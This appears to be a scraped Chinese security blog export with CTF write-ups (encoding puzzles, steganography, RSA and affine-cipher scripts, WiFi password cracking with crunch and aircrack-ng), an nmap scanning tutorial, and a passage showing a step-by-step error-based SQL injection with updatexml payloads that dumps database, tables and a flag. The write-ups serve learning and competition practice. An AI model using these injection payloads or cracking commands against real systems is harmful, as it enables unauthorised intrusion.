于是进行在线解密扫描二维码就能得到flag jactf{base58_base64_flag_very_easy} 这是什么玩意打开txt文件发现是一些有规律的字符串 =E4=BD=9B=E6=9B=B0=EF=BC=9A=E6=A2=B5=E5=83=A7=E5=A5=A2=E6=A5=9E=E5=A5=A2=E5=90=89=E8=8B=A5=E5=A5=A2=E4=B8=8D=E5=B8=9D=E5=86=A5=E5=A4=9C=E6=98=AF=E7=BC=BD=E6=9C=8B=E7=BC=BD=E7=9C=9F=E7=89=B9=E4=BF=B1=E4=B8=8A=E7=BD=B0=E8=83=BD=E7=9A=A4=E5=AE=A4=E9=98=BF=E8=AB=B3=E6=98=8E=E4=B8=80=E5=88=87=E5=91=90=E9=99=A4=E6=A2=B5=E5=A7=AA=E7=BC=BD=E5=A9=86=E5=91=90=E4=BA=A6=E5=8F=83=E4=BE=84=E5=91=BC=E7=9A=A4=E4=B8=96=E5=93=86=E7=89=B9=E5=93=86=E6=95=85=E5=8B=9D=E8=AB=B3=E7=88=8D=E8=AC=B9=E6=99=BA=E7=9A=A4=E5=8F=83=E5=AD=95=E9=80=9D=E8=AB=B3=E8=AC=B9=E6=BC=AB=E6=AD=BB=E5=8D=B3=E4=BE=84=E9=99=A4=E5=93=86=E9=80=9D=E4=BE=84=E6=98=AF=E5=A5=A2=E5=96=9D=E7=A4=99=E8=B1=86=E8=AB=B3=E6=A5=9E=E7=84=A1=E4=BF=B1=E8=80=85=E5=93=86=E5=BA=A6=E8=80=85=E3=80=82=E8=AB=B3=E7=9C=9F=E5=86=A5=E8=A8=B6=E4=BE=84=E5=8B=9D=E7=AB=9F=E8=97=9D=E5=A5=A2=E4=B8=8D=E4=BC=8A=E7=9A=A4=E8=AC=B9=E6=B6=85=E5=AD=95=E7=84=A1=E4=BB=96=E7=BE=85=E5=A4=A7=E5=BE=97=E9=97=8D=E5=93=86=E5=96=9D=E8=80=B6=E5=83=A7=E7=84=A1=E7=BE=AF=E6=BB=85=E9=99=A4=E5=88=A9=E7=BC=BD=E5=A4=9A=E6=A2=B5=E5=A4=B7=E6=A2=B5=E6=A0=97=E7=BC=BD=E8=80=85=E5=AD=95=E8=AB=B3=E7=9B=A7=E7=9A=A4=E4=B8=89=E7=BD=B0=E5=AF=AB=E8=80=81=E6=A2=B5=E8=80=B6=E5=AE=A4=E5=B8=9D=E6=A2=B5=E5=AF=AB=E7=BE=AF=E6=95=B8=E6=A2=B5=E7=9B=A1=E4=BE=84=E6=A0=97=E4=BE=84=E8=97=90=E4=BF=B1=E4=B8=96=E8=AB=B3=E4=B8=8A=E8=AB=B3=E5=A7=AA=E6=95=B8=E5=AE=A4=E5=A9=86=E7=BD=B0=E6=A7=83=E5=A5=A2=E8=A8=B6=E5=93=86=E5=A4=9A=E9=80=9D=E8=97=90=E9=81=93=E6=A2=B5=E6=A5=9E=E6=A2=B5=E5=8D=97=E4=BE=84=E8=BF=A6=E5=91=90=E7=9F=A5=E6=9C=8B=E6=A5=9E=E4=BE=84=E9=9B=A2=E5=91=90=E6=B2=99=E5=91=90=E6=99=BA=E9=81=AE=E5=A4=A7=E5=AE=A4=E7=A5=9E=E5=86=A5=E8=BC=B8=E6=AE=BF=E7=BC=BD=E6=A7=83=E6=A2=B5=E6=80=9B=E6=81=90=E8=88=8D=E7=9F=A5=E7=9A=A4=E8=BF=A6=E5=A5=A2=E8=88=AC=E8=AB=B3=E7=88=8D=E5=AF=AB=E6=BC=AB=E4=BC=8A=E4=BF=B1=E6=A0=97=E5=93=86=E4=BB=96=E4=BA=A6=E7=BC=BD=E6=A5=9E=E6=80=9B=E5=86=A5=E5=91=BC=E5=88=87=E4=BF=B1=E8=8F=A9=E8=88=8D=E5=91=90=E5=AF=A6=E6=A0=97=E5=A5=A2=E6=B3=A2=E6=91=A9=E8=AB=B3=E9=81=93=E7=BC=BD=E7=91=9F=E5=93=86=E5=AF=A6=E7=9A=A4=E7=88=8D=E5=8B=9D=E8=96=A9=E7=BD=B0=E8=AB=B8=E5=A5=A2=E8=88=AC=E8=AB=A6=E7=BD=B0=E6=98=8E=E7=BC=BD=E8=AB=A6=E5=B0=BC=E5=93=86=E6=A5=9E=E4=BD=9B=E4=BF=B1=E9=86=AF=E8=AB=B3=E6=BB=85=E5=BA=A6=E5=93=86=E6=89=80=E6=A7=83=E5=A7=AA=E9=BA=BC=E6=89=80=E6=81=90=E8=AB=B3=E4=BB=96=E4=BE=84=E5=AF=AB=E7=91=9F=E4=BE=84=E6=89=80=E5=BE=97=E9=9A=B8=E5=93=86=E9=97=8D=E5=91=90=E6=8F=90=E7=9B=A7=E5=86=A5=E5=92=92=E5=A5=A2=E6=9B=B0=E5=91=90=E6=B2=99=E6=80=AF=E8=88=AC=E5=8D=97=E6=80=AF=E5=9C=B0=E7=BC=BD=E5=96=9D=E5=86=A5=E6=83=B3=E5=91=90=E7=9B=A7=E7=BD=B0=E8=AC=B9=E5=91=BC=E8=B7=8B=E7=BC=BD=E4=B8=8A=E5=A8=91=E8=AB=A6=E6=AD=BB=E4=BE=84=E8=BF=A6 百度一波发现是 Quoted-printable编码 开始解码 解码获得一个佛曰 于是想到了 与佛论禅 社会主义核心价值观编码 解码获得flag flag为： jactf{hexin_yufo_qp} 你对我的网站做了什么这是一个流量包分析题，打开流量包直接追踪数据流 发现了php代码 关于一种加密方式 还有一个和flag有关的数据流 分析可知是通过对flag.txt的内容进行加密 绕后输出的 于是写出解密的方法 &lt;?php $str = &quot;eJxLy0lMrw6NTzPMS4n3TVWsBQAz4wXi&quot;; echo gzuncompress(base64_decode($str, 6)); ?&gt; 得到flag： flag{U_f1nd_Me!} 小梳子题目叫我们破解wifi密码，已知wifi密码是手机号，前六位是138364，那么就很好办，我们可以自己做一个字典，直接爆破就得到了。 首先使用kali工具生成我们想要的字典 crunch 11 11 -t 138364%%%%% -o/root/chuddy/test.txt 解析：11代表字典最小和最大位都是11位，%代表数字，-o为输出路径 然后开始爆破这个wifi aircrack-ng -w /root/chuddy/test.txt Tenda_D07D90-01.cap 输入对应的编号：1，然后就是开始爆破 得到flag： jactf{13836458932} 这不是真的图片打开是一个图片 分析无果 binwalk一下 发现里面有一个压缩包 但是foremost却不能分离出来 winhex打开文件 查找 14000000 发现压缩包的头 被改为了 ja66 改回之后 再进行分离 打开压缩包 发现需要输入密码 尝试ja66 打开了 发现好多个文件夹 每个文件夹里面都有一个字母 有这些字母组成flag 编写脚本 import base64 flag=&#39;&#39; for i in range(32): f=open(&#39;./subject/&#39;+str(i)+&#39;/&#39;+str(i)+&#39;.txt&#39;,&#39;r&#39;) flag+=f.read() print flag print base64.b64decode(flag) 得到flag： jactf{64se64_1s_50_c001} 该死的温柔这道题就是使用了隐写工具OutGuess，它是一种通用的隐写工具，可以插入将隐藏信息存入数据源的冗余位。 安装工具kali终端命令： git clone https://github.com/crorvick/outguess 下载之后双击打开文件夹 输入命令 ./configure&amp;&amp; make &amp;&amp; make install 即可安装成功 查看这个图片的属性，发现备注有个guess 这就是要工具解密的密码然后构造命令 root@kali:~/chuddy/ctf/jactf/# outguess -k &quot;guess&quot; -r flag.jpg chuddy.txt Reading flag.jpg.... Extracting usable bits: 11538 bits Steg retrieve: seed: 206, len: 33 得到flag jactf{jactf_guess_steganography} 怀疑人生打开发现是三个文件 第一个文件是一个压缩包 需要密码才能打开 于是想到用工具去跑 跑出来密码为 password 打开发现时一串字母 用base64解码得到第一部分的flag flag{hacker 第二个文件是一个图片使用binwalk分析这个图片 发现隐藏的压缩包 foremost分离 打开压缩包 发现需要密码 用winhex打开发现时压缩包伪加密 把全局伪加密 01 00 ，改为00 00后保存 解压得到了一个txt文件 打开后发现是有 .?!组成的 想到了ook解密 ook解密 解密获得字符串 3oD54e 用base58解密获得第二部分的flag misc 第三个文件像是一个二维码 使用二维码识别工具进行识别 得到最后一部分的flag 12580} 三部分拼接在一起结构成了flag flag{hackermisc12580} CRYPTO签到题发现了一串字符串 像十六进制 #coding:utf-8 import binascii str = &quot;6A616374667B6865785F69735F656173797D&quot; print binascii.a2b_hex(str) 得到flag jactf{hex_is_easy} 罗马帝国的奠基者给了一些奇怪的字符串 h^_o`[pZi^i` 这和jactf前五个字符的ascii码值相差2，3，4，5，6 编写脚本 str = &quot;h^_o`[pZi^i`&quot; flag = &quot;&quot; c=2 for i in range(len(str)): flag += chr(ord(str[i])+c) c=c+1 print flag 得到flag： jactf{bxcsium} 贝斯家族三英战群魔看到这个题目就这到和basae解码有关 打开txt文件是一长串的字符串 对其进行base16，base32，base64循环解码 就能得到flag jactf{4(b64_32_16)} 绝密文件打开文件 作为我潜伏在宝岛地下工作者小菜截获了一段绝密的情报，具体如下： WzI2NDAzMjMxMEwsIDQ5NTA2MzczNDFMLCA0MTg5MTM3MjM1TCwgMzUwMzY3NTkwNkwsIDExOTMyNzJMLCAzNzQ1MzA5NjhMLCA1MTg5MjgxNTMxTCwgMjUxNDIwMDI3MkwsIDQ0NTQzMDU1ODFMLCA2NDEwNzg1OTdMLCA0Mzk1OTMxNjU5TCwgMjcxNjQyNjU5OUwsIDQzNzUzOTE5NEwsIDM0NDgwMTM1OTZMLCAzMDcyMDcyMDlMLCA0NzUwODIwNjA2TCwgMzI1MDQwNzk5M0wsIDg1MzkwNTIwOUwsIDIxMDk3OTExNTlMLCAyNzE2NDI2NTk5TCwgMjEwNzg5OTU1NEwsIDQzOTU5MzE2NTlMLCAyNzk0Mzg0NTk4TCwgMjEwOTc5MTE1OUwsIDUyOTc3NzkwOTRMLCAxNDYwODc0Mjg2TCwgMTQ2MDg3NDI4NkwsIDc5NDkzMTY3OUwsIDc5NDkzMTY3OUwsIDU0NDcwNTE2MjJMLCA4NTM5MDUyMDlMLCAzMTk4MzQwMjE4TCwgMTE5MzI3MkwsIDE5MTIzMjMxMDFMLCA1Mjk3Nzc5MDk0TCwgMzA3MjA3MjA5TCwgMzIzMTU3MjYwOEwsIDMxOTgzNDAyMThMLCA1MTg5MjgxNTMxTCwgNTI3ODg5NTQ4TCwgNDk1MDYzNzM0MUwsIDI4MzkzNjY4MDVMLCAxMTE2NDU3MzU0TCwgNTI3ODg5NTQ4TCwgNTI5Nzc3OTA5NEwsIDMyNTA0MDc5OTNMLCA0NDU0MzA1NTgxTCwgNjUxMDM5MkwsIDMyNTA0MDc5OTNMLCAxNDYwODc0Mjg2TCwgMTA1OTAzNTEyOUwsIDMyMDAzNTk2MTJMLCA4NTM5MDUyMDlMLCAzMDcyMDcyMDlMLCAxNTY3NzkxMDFMLCAyMTQ1MzAxMzI4TCwgNTI3ODg5NTQ4TCwgMTA1OTAzNTEyOUwsIDU0NjgwMjUwNzJMLCAzNDQ4MDEzNTk2TCwgMjEwNzg5OTU1NEwsIDQxODkxMzcyMzVMLCAzNTAzNjc1OTA2TCwgMjY1MzQzNjExM0x 而且小菜昨天偷听到了一部分关于情报的绝密资料，如下：N=5520780427 , e = 134257,你能帮小菜解出这段情报吗？ base64解密获得 [264032310L, 4950637341L, 4189137235L, 3503675906L, 1193272L, 374530968L, 5189281531L, 2514200272L, 4454305581L, 641078597L, 4395931659L, 2716426599L, 437539194L, 3448013596L, 307207209L, 4750820606L, 3250407993L, 853905209L, 2109791159L, 2716426599L, 2107899554L, 4395931659L, 2794384598L, 2109791159L, 5297779094L, 1460874286L, 1460874286L, 794931679L, 794931679L, 5447051622L, 853905209L, 3198340218L, 1193272L, 1912323101L, 5297779094L, 307207209L, 3231572608L, 3198340218L, 5189281531L, 527889548L, 4950637341L, 2839366805L, 1116457354L, 527889548L, 5297779094L, 3250407993L, 4454305581L, 6510392L, 3250407993L, 1460874286L, 1059035129L, 3200359612L, 853905209L, 307207209L, 156779101L, 2145301328L, 527889548L, 1059035129L, 5468025072L, 3448013596L, 2107899554L, 4189137235L, 3503675906L, 2653436113L] 对n进行因式分解获得pq 分解p q网站 然后一个解密脚本 # encoding:utf8 import rsa import sys import gmpy2 marr= [264032310L, 4950637341L, 4189137235L, 3503675906L, 1193272L, 374530968L, 5189281531L, 2514200272L, 4454305581L, 641078597L, 4395931659L, 2716426599L, 437539194L, 3448013596L, 307207209L, 4750820606L, 3250407993L, 853905209L, 2109791159L, 2716426599L, 2107899554L, 4395931659L, 2794384598L, 2109791159L, 5297779094L, 1460874286L, 1460874286L, 794931679L, 794931679L, 5447051622L, 853905209L, 3198340218L, 1193272L, 1912323101L, 5297779094L, 307207209L, 3231572608L, 3198340218L, 5189281531L, 527889548L, 4950637341L, 2839366805L, 1116457354L, 527889548L, 5297779094L, 3250407993L, 4454305581L, 6510392L, 3250407993L, 1460874286L, 1059035129L, 3200359612L, 853905209L, 307207209L, 156779101L, 2145301328L, 527889548L, 1059035129L, 5468025072L, 3448013596L, 2107899554L, 4189137235L, 3503675906L, 2653436113L] p = 54163 q = 101929 n = 5520780427 e = 134257 d= int(gmpy2.invert(e , (p-1) * (q-1))) result=&quot;&quot; for j in marr: result += chr(pow(j,d,n)) print result 得到 U2FsdGVkX1/8DKBmhvO87/SOLaawwxvAdHLB9AV62nC6LhXzhatpvBcg6tlK7Fs5 对其进行DES解密 得到flag jactf{So_easy_RSA_and_DES} 贝叶斯打开是一个密码本 需要解密 仿射密码 脚本如下 #include &lt;iostream&gt; #include &lt;cstring&gt; using namespace std; int gcd(int m, int n); int init_gcd(int m, int n); int des_find(string p, int m); #define PSIZE 65 //宏定义密码表大小 int main() { string P(&quot;zQWERTYUIOPxcvbnmasdfASDFGHJKLghjkl_qwZXCVBNMert{yuiop}0123498765&quot;), M(&quot;gf9C{YQ34KHN3sOwhCz3RzH3CKj3Ndpm1Bt7&quot;); //明文空间，与已知密文 string C; //存放解密明文 int i = 2; //求解所有互素的数 int a1; //存放逆元 for (i; i &lt; PSIZE; i++) { if (gcd(i, PSIZE) == 1) { //说明此时的i与28互素 /***求解此时的i的逆元***/ a1 = init_gcd(i, PSIZE); for (int j = 0; j &lt; PSIZE; j++) //控制b的遍历 { cout &lt;&lt; &quot;此时：a=&quot; &lt;&lt; i &lt;&lt; &quot; b=&quot; &lt;&lt; j &lt;&lt; &quot; a的逆元为：&quot; &lt;&lt; a1 &lt;&lt; &quot; \\&quot;&quot;; for (int k = 0; k &lt; M.length(); k++) { //每一个汉字站两个字节，所以要用两个数组空间来存 int where = des_find(P, M[k]); //匹配密文在明文空间的位置 where = ((where - j)*a1) % PSIZE; if (where &lt; 0) { where += PSIZE; } cout &lt;&lt; P[where]; } cout &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; endl; } } } return 0; } int gcd(int b, int a) //求互素 { int temp; if (a &lt; b)//判断大小 { temp = a; a = b; b = temp; } if (b == 0) return a; else return gcd(b, a%b);//递归 } int init_gcd(int m, int n) //扩展欧几里得算法 { int i = 2; for (i; i &lt; 28; i++) { if ((m*i) % n == 1) { return i; } } } int des_find(string p, int m) //位置匹配函数 { for (int i = 0; i &lt; p.length(); i ++) { //cout&lt;&lt;p[i]&lt;&lt;p[i+1]&lt;&lt;endl; if (m == p[i]) { return i; } } } 跑出来 找到了flag jactf{I_10ve_Crypto_Yov_t0O_e8963F5} 不会奔跑的数字和下划线打开题目发现是 url加密 加密之后 进行base16解密 最后进行base64解密 得到 和flag长得相似的字符串 NEGXJ{48_ter_119_xsoirw_teww} 根据题目 我们只考虑字母发现这一些字符前五位和JACTF的ascii码相差5 str = &quot;NEGXJ{48_ter_119_xsoirw_teww}&quot; str_2 = &quot;NEGXJterxsoirwteww&quot; flag = &quot;&quot; x = 4 for i in str: if i.isalpha(): flag += chr(int(ord(i)-x)) else: flag += i print flag 得到flag: JACTF{48_pan_119_tokens_pass}","categories":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/categories/writeup/"}],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"}]},{"title":"nmap的使用","slug":"nmap的使用","date":"2019-04-08T15:13:29.000Z","updated":"2019-05-29T12:42:50.249Z","comments":true,"path":"2019/04/08/nmap的使用/","link":"","permalink":"http://yoursite.com/2019/04/08/nmap的使用/","excerpt":"nmapNMap，也就是Network Mapper，是Linux下的网络扫描和嗅探工具包。","text":"nmapNMap，也就是Network Mapper，是Linux下的网络扫描和嗅探工具包。 nmap的主要功能 探测一组主机是否在线 扫描主机的端口，嗅探所提供的网络服务 推断主机所使用的操作系统 nmap 端口状态的判断open : 应用程序在该端口接受TCP连接或者UDP报文 closed ：关闭的端口对于nmap也是可访问的， 它接收nmap探测报文并作出响应。但没有应用程序在其上监听。 filtered ：由于包过滤阻止探测报文到达端口，nmap无法确定该端口是否开放。过滤可能来自专业的防火墙设备，路由规则 或者主机上的软件防火墙。 unfiltered ：未被过滤状态意味着端口可访问，但是nmap无法确定它是开放还是关闭。 只有用于映射防火墙规则集的 ACK 扫描才会把端口分类到这个状态。 open | filtered ：无法确定端口是开放还是被过滤， 开放的端口不响应就是一个例子。没有响应也可能意味着报文过滤器丢弃了探测报文或者它引发的任何反应。UDP，IP协议,FIN, Null 等扫描会引起。 closed|filtered：（关闭或者被过滤的）：无法确定端口是关闭的还是被过滤的 nmap的基础语法 namp -A [ip地址]全面扫描指定IP namp 192.168.1.1/24扫描整个子网 nmap [ip地址1] [ip地址2]扫描多个目标 nmap 192.168.1.1-100扫描一个范围内的目标 扫描ip地址为192.168.1.1-192.168.1.100内的所有主机 nmap -iL 1.txt扫描1.txt下的所有的IP列表 nmap -sL 192.168.1.1/24可以看到你扫描的所有主机的列表 nmap 192.168.1.1/24 -exclude 192.168.1.1扫描除了某一个ip外的所有子网主机 nmap 192.168.1.1/24 -exclude 1.txt`扫描除了某一个文件中ip外的子网主机 - nmap -p80,21,23 192.168.1.1 扫描特定主机的80，21，23端口 - nmap -p 80-160 192.168.0.101 扫描指定范围内的端口 - nmap 192.168.0.101,102,103 使用IP地址的最后一个字节扫描多台服务器 以上为nmap的最常用的基础命令 - nmap -sP 192.168.43.8/24 ping扫描方式，只进行ping，然后显示在线的主机。这样获取目标信息而不会被轻易发现发现。ping扫描只是判断主机是否存活在网络中。 - nmap -P0 192.168.1.1 无ping扫描：通常用于防火墙禁止ping的情况下，它能确定正在运行的机器。 nmap -P0 [协议1、协议2] [目标ip]nmap支持的协议和编号1.tcp:对应的协议编号为62.ICMP:对应的协议编号为13.IGMP：对应的协议编号为24.UDP：对应的协议编号为17通过使用TCP、UDP、IGMP协议向目标主机发送包并判断目标主机是否在线 - nmap -sS 192.168.1.1 不会在目标主机产生日志信息，通过TCP的SYN包获取主机信息 - nmap -sT 192.168.1.1 适用于找出TCP和UDP端口 - nmap -sU 192.168.1.1 用来扫描主机打开的UDP端口：不会发送syn包，通过发送udp数据包到目标主机，等待目标主机响应，返回ICMP不可达，代表端口关闭。 - nmap -sF 192.168.1.1 不会在目标主机产生日志信息如果TCP SYN被防火墙拦截，用FIN标志的数据包获取主机信息。（FIN重置位，用来代表断开连接） - nmap -sV 192.168.1.1 扫描目标主机的端口上运行的软件版本 它不是用于扫描目标主机开放的端口，但需要从开放的端口获取信息来判断软件的版本，所以需要先进行端口扫描。 - nmap -sL 192.168.1.7 192.168.1.1 伪装一个主机的ip发送扫描数据包 - nmap -A 192.168.1.1 检测目标主机系统信息和路由信息 - nmap -O 192.168.1.1 检测目标主机操作系统和软件 - nmap -sA 192.168.1.1 扫描住的侦测防火墙 - nmap -PN 192.168.1.1 扫描主机是不是由防火墙的保护 - nmap -F 192.168.1.1 快速扫描，仅扫描列在nmap-services文件中的端口而避开所有其他端口 - nmap -r 192.168.1.1 顺序扫描端口 - nmap --iflist 打印本地主机接口和路由 - nmap -sN 192.168.1.1 TCP空扫描`","categories":[],"tags":[{"name":"安全工具","slug":"安全工具","permalink":"http://yoursite.com/tags/安全工具/"}]},{"title":"2019年嘉韦思杯wp","slug":"上海嘉韦思杯","date":"2019-03-30T16:00:00.000Z","updated":"2019-05-29T12:33:15.805Z","comments":true,"path":"2019/03/31/上海嘉韦思杯/","link":"","permalink":"http://yoursite.com/2019/03/31/上海嘉韦思杯/","excerpt":"2019年嘉韦思杯wp","text":"2019年嘉韦思杯wp 土肥原贤二发现存在报错注入的可能： 于是进行尝试 1&#39; and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)# 得到信息： could not to the database XPATH syntax error: &#39;~5.7.25-log~&#39; 爆库： 1&#39; and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)# could not to the database XPATH syntax error: &#39;~luozhen~&#39; 爆表： 1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)# could not to the database XPATH syntax error: &#39;~flag,goods~&#39; 爆列名： 1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;),0x7e),1)# could not to the database XPATH syntax error: &#39;~id,flag~&#39; 得到flag: 1&#39; and updatexml(1,concat(0x7e,(SELECT flag from flag),0x7e),1)# could not to the database XPATH syntax error: &#39;~20_welcome_19~&#39; flag{20_welcome_19} 吴佩孚打开连接发现是特别长的一个字符串 二话不说直接base64解码 (![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+!+[]]]+(![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[!+[]+!+[]]+(![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+([][[]]+[])[!+[]+!+[]]+(![]+[])[+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!